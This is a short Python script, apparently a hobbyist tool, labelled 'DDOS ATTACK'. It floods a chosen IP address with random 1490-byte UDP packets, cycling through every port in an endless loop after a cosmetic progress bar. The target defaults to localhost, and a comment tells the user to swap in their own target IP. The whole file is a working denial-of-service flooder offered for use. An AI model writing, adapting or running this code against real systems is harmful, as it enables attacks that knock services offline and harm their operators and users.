import sys
import os
import time
import socket
import random
from datetime import datetime

# Get current time info
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Create socket object for UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

# Clear the terminal screen
os.system("clear")

# Title
print("\n----------------------------------------------------")
print("\n---------      D D O S     A T T A C K     ---------")
print("\n----------------------------------------------------\n")

# Target info
ip = '127.0.0.1'  # Change to your target IP (for local testing use 127.0.0.1)
port = 1024       # Starting port

print(f"\nThe IP address of the Host to Attack is : {ip}")
print(f"\nThe PORT address of the Host to Attack is : {port}")
print("\n----------------------------------------------------\n")

# Simulated progress bar
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)
print("\n----------------------------------------------------\n")

# Start flooding
sent = 0
while True:
    sock.sendto(bytes_data, (ip, port))
    sent += 1
    port += 1
    print(f"Sent {sent} packet to {ip} through port:{port}")
    
    if port > 65534:
        port = 1
    # Optional: slow down flood to observe
    # time.sleep(0.01)
